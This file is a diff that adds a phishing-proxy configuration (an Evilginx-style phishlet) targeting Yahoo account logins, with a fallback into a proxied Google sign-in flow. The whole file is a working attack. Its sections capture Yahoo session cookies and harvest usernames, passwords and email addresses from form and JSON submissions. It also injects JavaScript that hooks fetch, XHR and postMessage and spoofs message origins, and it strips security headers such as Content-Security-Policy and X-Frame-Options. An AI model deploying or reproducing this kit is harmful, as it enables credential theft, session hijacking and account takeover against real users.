@@ -1,0 +1,390 @@
+author: 'evilhooked'
+min_ver: '4.3.3'
+
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'udc', orig_sub: 'udc', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '3p-udc', orig_sub: '3p-udc', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gpt.mail', orig_sub: 'gpt.mail', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'recaptcha', orig_sub: 'www', domain: 'recaptcha.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www.google', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'yaccounts', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+
+puppet:
+  enabled: true
+  mode: 'mirror'
+  upstream: 'http://127.0.0.1:1000'
+  hosts:
+    - 'login.yahoo.com'
+    - 'guce.yahoo.com'
+    - 'udc.yahoo.com'
+    - '3p-udc.yahoo.com'
+    - 'mail.yahoo.com'
+    - 'gpt.mail.yahoo.com'
+    - 'www.yahoo.com'
+    - 's.yimg.com'
+    - 'www.gstatic.com'
+    - 'www.recaptcha.net'
+    - 'accounts.google.com'
+    - 'ssl.gstatic.com'
+    - 'www.google.com'
+    - 'fonts.gstatic.com'
+    - 'apis.google.com'
+    - 'accounts.youtube.com'
+    - 'play.google.com'
+
+sub_filters:
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login\.yahoo\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'gpt.mail', domain: 'yahoo.com', search: 'https://gpt\.mail\.yahoo\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'gpt.mail', domain: 'yahoo.com', search: 'gpt\.mail\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https://s\.yimg\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/css', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 's\.yimg\.com', replace: '{hostname}', mimes: ['text/html', 'text/css', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'udc', domain: 'yahoo.com', search: 'udc\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'mail', domain: 'yahoo.com', search: 'mail\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'gstatic', domain: 'gstatic.com', search: 'www\.gstatic\.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'recaptcha', domain: 'recaptcha.net', search: 'www\.recaptcha\.net', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts\.google\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts\.google\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'udc.yahoo.com', orig_sub: 'udc', domain: 'yahoo.com', search: 'udc\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: 's\.yimg\.com', replace: '{hostname}', mimes: ['text/css', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'gpt.mail.yahoo.com', orig_sub: 'gpt.mail', domain: 'yahoo.com', search: 'gpt\.mail\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'gpt.mail.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'gpt.mail.yahoo.com', orig_sub: 'mail', domain: 'yahoo.com', search: 'mail\.yahoo\.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['A1', 'A1S', 'A3', 'Y', 'T', 'F', 'PH']
+  - domain: 'yahoo.com'
+    keys: ['A1', 'A1S', 'A3', 'Y', 'T', 'F', 'PH']
+  - domain: '.login.yahoo.com'
+    keys: ['A1', 'A1S', 'Y', 'T']
+  - domain: 'login.yahoo.com'
+    keys: ['A1', 'A1S', 'Y', 'T']
+
+auth_urls:
+  - '/account/challenge/password'
+  - '/account/challenge/password/*'
+  - '/account/challenge/password/verify*'
+  - '/account/challenge/password/validate*'
+  - '/account/challenge/tpa*'
+  - '/CheckCookie'
+  - '/?.src=*'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'account'
+      search: '"account"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'username'
+      search: '"username"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'f\\.req'
+      search: '(\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b)'
+      type: 'post'
+    - key: 'unenc_pwd'
+      search: '(.*)'
+      type: 'post'
+
+js_inject:
+  - trigger_domains: ["login.yahoo.com", "guce.yahoo.com", "udc.yahoo.com", "mail.yahoo.com", "gpt.mail.yahoo.com", "www.yahoo.com", "s.yimg.com", "accounts.google.com", "accounts.youtube.com"]
+    trigger_paths: ['/.*/']
+    trigger_mimes: ['text/html']
+    trigger_params: []
+    script: |
+      (function() {
+        if (window.__yahPf) return;
+        window.__yahPf = 1;
+        var pfHostMap = {
+          "login.yahoo.com":"login",
+          "guce.yahoo.com":"guce",
+          "udc.yahoo.com":"udc",
+          "3p-udc.yahoo.com":"3p-udc",
+          "mail.yahoo.com":"mail",
+          "gpt.mail.yahoo.com":"gpt.mail",
+          "www.yahoo.com":"www",
+          "s.yimg.com":"s",
+          "www.gstatic.com":"gstatic",
+          "www.recaptcha.net":"recaptcha",
+          "accounts.google.com":"accounts",
+          "ssl.gstatic.com":"ssl",
+          "www.google.com":"www.google",
+          "fonts.gstatic.com":"fonts",
+          "apis.google.com":"apis",
+          "accounts.youtube.com":"yaccounts"
+        };
+        function pfMatchHost(h) {
+          if (!h) return false;
+          return Object.prototype.hasOwnProperty.call(pfHostMap, String(h).toLowerCase());
+        }
+        function pfPhishBase() {
+          var h = location.hostname.toLowerCase();
+          var subs = Object.keys(pfHostMap).map(function(k) { return pfHostMap[k]; }).filter(Boolean);
+          subs.sort(function(a, b) { return b.length - a.length; });
+          for (var i = 0; i < subs.length; i++) {
+            var ps = subs[i];
+            if (h === ps) return h;
+            if (h.indexOf(ps + '.') === 0) return h.slice(ps.length + 1);
+          }
+          var p = h.split('.');
+          if (p.length >= 3) return p.slice(1).join('.');
+          return h;
+        }
+        function pfMapHost(hostname) {
+          if (!pfMatchHost(hostname)) return hostname;
+          var h = String(hostname).toLowerCase();
+          var ps = pfHostMap[h];
+          var base = pfPhishBase();
+          return ps ? ps + '.' + base : base;
+        }
+        function pfGoogleHost() {
+          return pfMapHost('accounts.google.com');
+        }
+        function pfRewriteUrl(url) {
+          try {
+            var u = new URL(url, location.href);
+            var path = u.pathname || '';
+            var onYahooLogin = /^login\./i.test(location.hostname);
+            if (onYahooLogin && u.hostname === location.hostname && /^\/(v3\/signin|o\/oauth2|gsi\/|signin\/v2)/i.test(path)) {
+              u.hostname = pfGoogleHost();
+            }
+            if (!pfMatchHost(u.hostname)) return url;
+            u.hostname = pfMapHost(u.hostname);
+            return u.toString();
+          } catch (e) { return url; }
+        }
+        function pfRewriteOrigin(orig) {
+          if (!orig || orig === '*') return orig;
+          try {
+            var u = new URL(orig, location.href);
+            if (pfMatchHost(u.hostname)) return u.protocol + '//' + pfMapHost(u.hostname);
+          } catch (e) {}
+          return orig;
+        }
+        function pfIsGoogleOverlay() {
+          if (/\/account\/challenge\/tpa/i.test(location.pathname)) return true;
+          try {
+            var t = (document.body && document.body.innerText) || '';
+            if (/Вход через аккаунт Google|Sign in with Google|accounts\.google\.com/i.test(t)) return true;
+            if (document.querySelector('iframe[src*="accounts.google"],iframe[src*="/v3/signin"],iframe[src*="/o/oauth2"]')) return true;
+          } catch (e) {}
+          return false;
+        }
+        function pfFindGoogleAuth() {
+          var dest = '';
+          try {
+            document.querySelectorAll('iframe[src],a[href]').forEach(function(el) {
+              var s = el.getAttribute('src') || el.getAttribute('href') || '';
+              if (/\/o\/oauth2\//i.test(s) || /\/v3\/signin\//i.test(s)) dest = pfRewriteUrl(s);
+            });
+            if (!dest) {
+              var html = document.documentElement && document.documentElement.innerHTML || '';
+              var m = html.match(/https:\/\/accounts\.google\.com\/o\/oauth2\/[^"'\\\s<]+/i);
+              if (m) dest = pfRewriteUrl(m[0].replace(/&amp;/g, '&'));
+            }
+          } catch (e) {}
+          return dest;
+        }
+        function pfGoGooglePwd() {
+          if (window.__yahGoG) return;
+          if (!pfIsGoogleOverlay()) return;
+          var dest = pfFindGoogleAuth();
+          if (!dest) dest = 'https://' + pfGoogleHost() + '/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en';
+          window.__yahGoG = 1;
+          setTimeout(function() { location.replace(dest); }, 50);
+        }
+        function pfPatchLinks(root) {
+          var scope = root || document;
+          if (!scope.querySelectorAll) return;
+          scope.querySelectorAll('a[href],form[action],script[src],link[href],iframe[src],frame[src],embed[src],img[src],[data-url],[data-href]').forEach(function(el) {
+            if (el.tagName === 'SCRIPT' || el.tagName === 'LINK' || el.tagName === 'IFRAME') el.removeAttribute('crossorigin');
+            ['src','href','action','data-url','data-href'].forEach(function(attr) {
+              var v = el.getAttribute(attr);
+              if (v && (/^(https?:)?\/\//i.test(v) || v.charAt(0) === '/')) el.setAttribute(attr, pfRewriteUrl(v));
+            });
+          });
+        }
+        try {
+          var ip = HTMLIFrameElement.prototype;
+          var id = Object.getOwnPropertyDescriptor(ip, 'src');
+          if (id && id.set) {
+            Object.defineProperty(ip, 'src', {
+              configurable: true,
+              enumerable: id.enumerable,
+              get: id.get,
+              set: function(v) { id.set.call(this, typeof v === 'string' ? pfRewriteUrl(v) : v); }
+            });
+          }
+        } catch (e) {}
+        try {
+          var _pm = Window.prototype.postMessage;
+          Window.prototype.postMessage = function(message, targetOrigin, transfer) {
+            var t = targetOrigin;
+            try {
+              if (typeof t === 'string' && t !== '*') {
+                t = pfRewriteOrigin(t);
+                var rec = '';
+                try { rec = this.origin; } catch (e2) {}
+                if (!rec) {
+                  try { rec = this.location && this.location.origin; } catch (e3) {}
+                }
+                if (rec && t !== rec) t = rec;
+              }
+            } catch (e4) {}
+            if (arguments.length >= 3) return _pm.call(this, message, t, transfer);
+            return _pm.call(this, message, t);
+          };
+        } catch (e) {}
+        try {
+          var _ael = EventTarget.prototype.addEventListener;
+          EventTarget.prototype.addEventListener = function(type, listener, options) {
+            if (String(type) === 'message' && typeof listener === 'function') {
+              var wrap = function(ev) {
+                try {
+                  var o = ev && ev.origin;
+                  var base = pfPhishBase();
+                  if (o && base && o.indexOf('.' + base) >= 0) {
+                    var want = o;
+                    if (/^https:\/\/accounts\./i.test(o)) want = 'https://accounts.google.com';
+                    else if (/^https:\/\/login\./i.test(o)) want = 'https://login.yahoo.com';
+                    if (want !== o) Object.defineProperty(ev, 'origin', { configurable: true, enumerable: true, get: function() { return want; } });
+                  }
+                } catch (e2) {}
+                return listener.call(this, ev);
+              };
+              return _ael.call(this, type, wrap, options);
+            }
+            return _ael.call(this, type, listener, options);
+          };
+        } catch (e) {}
+        function pfIsNoise(url) {
+          return /consentRecord|3p-udc\.|analytics3|yahoo\.net|\/log\/forms|uber\.|pr\.uol|play\.google\.com\/log/i.test(String(url || ''));
+        }
+        if (window.fetch) {
+          var _fetch = window.fetch.bind(window);
+          window.fetch = function(input, init) {
+            var rawUrl = typeof input === 'string' ? input : (input && input.url) || '';
+            if (pfIsNoise(rawUrl)) return Promise.resolve(new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } }));
+            var rw = pfRewriteUrl(rawUrl);
+            if (pfIsNoise(rw)) return Promise.resolve(new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } }));
+            if (typeof input === 'string') input = rw;
+            else if (input && input.url) input = new Request(rw, input);
+            return _fetch(input, init).then(function(resp) {
+              if (rw.indexOf('batchexecute') >= 0 && resp.status >= 400) pfGoGooglePwd();
+              return resp;
+            });
+          };
+        }
+        if (window.XMLHttpRequest) {
+          var _open = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function() {
+            var args = Array.prototype.slice.call(arguments);
+            if (args[1]) args[1] = pfRewriteUrl(args[1]);
+            var xhr = this;
+            if (String(args[1] || '').indexOf('batchexecute') >= 0) {
+              xhr.addEventListener('load', function() { if (xhr.status >= 400) pfGoGooglePwd(); });
+              xhr.addEventListener('error', pfGoGooglePwd);
+            }
+            return _open.apply(this, args);
+          };
+        }
+        pfPatchLinks(document);
+        if (/\/account\/challenge\/(tpa|pwd)/i.test(location.pathname)) {
+          setTimeout(function() { if (pfIsGoogleOverlay()) pfGoGooglePwd(); }, 200);
+        }
+        if (window.MutationObserver) {
+          new MutationObserver(function(muts) {
+            muts.forEach(function(m) {
+              m.addedNodes.forEach(function(n) {
+                if (n.nodeType === 1) pfPatchLinks(n);
+              });
+            });
+          }).observe(document.documentElement, { childList: true, subtree: true });
+        }
+      })();
+
+flow:
+  cors_credentials: true
+  css_url_canary: false
+  puppet_mirror:
+    sidecar_login_host: login.yahoo.com
+    sidecar_proxy_hosts:
+      - login.yahoo.com
+      - guce.yahoo.com
+      - udc.yahoo.com
+      - 3p-udc.yahoo.com
+      - gpt.mail.yahoo.com
+      - s.yimg.com
+      - www.gstatic.com
+      - www.recaptcha.net
+      - accounts.google.com
+      - ssl.gstatic.com
+      - www.google.com
+      - fonts.gstatic.com
+      - apis.google.com
+      - accounts.youtube.com
+      - play.google.com
+    sidecar_bootstrap:
+      - host: login.yahoo.com
+        paths:
+          - /
+          - /account/challenge/username
+          - /account/challenge/password
+      - host: accounts.google.com
+        paths:
+          - /v3/signin/identifier
+          - /v3/signin/challenge/pwd
+          - /o/oauth2/v2/auth
+  dynamic_hosts:
+    - domain: yahoo.com
+      preserve_sub: true
+      session: false
+      auto_filter: true
+      allow_multi_label: true
+      include_sub_re: '(^|\.)mail$'
+      log_discover: true
+  header_rules:
+    - match:
+        host_contains:
+          - yahoo.com
+          - yahoo.net
+          - yimg.com
+          - gstatic.com
+          - recaptcha.net
+          - google.com
+          - youtube.com
+      response:
+        strip:
+          - Content-Security-Policy
+          - Content-Security-Policy-Report-Only
+          - X-Frame-Options
+          - Permissions-Policy
+          - Feature-Policy
+          - Cross-Origin-Resource-Policy
+          - Cross-Origin-Embedder-Policy
+          - Cross-Origin-Opener-Policy
